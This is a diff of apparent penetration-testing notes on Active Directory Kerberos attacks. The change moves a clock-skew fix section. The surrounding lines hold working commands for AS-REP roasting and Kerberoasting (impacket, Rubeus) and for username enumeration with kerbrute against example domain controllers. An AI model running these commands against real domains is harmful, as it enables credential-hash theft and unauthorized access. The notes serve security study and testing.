@@ -46,6 +46,12 @@ impacket-GetNPUsers -dc-ip <ip> -no-pass <domain>/<user>
 -   **asreproast** : AS-REP Roasting 공격 수행 모드.
 -   **/nowrap** : 해시가 여러 줄로 나뉘지 않고 한 줄로 출력되도록 설정.
 ---
+# Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
+```bash
+sudo timedatectl set-ntp off
+sudo rdate -n [IP of Target]
+```
+---
 # Kerberoasting
 ``` powershell
 .\Rubeus.exe kerberoast /outfile:hashes.kerberoast
@@ -65,12 +71,6 @@ sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
 impacket-GetUsersSPNs -request -dc-ip <ip> <domain>/<user> -no-pass
 
 ./kerbrute_linux_amd64 userenum --dc 192.168.133.40 -d haero /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
-```
----
-# Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
-```bash
-sudo timedatectl set-ntp off
-sudo rdate -n [IP of Target]
 ```
 ---
 # Silver Tickets
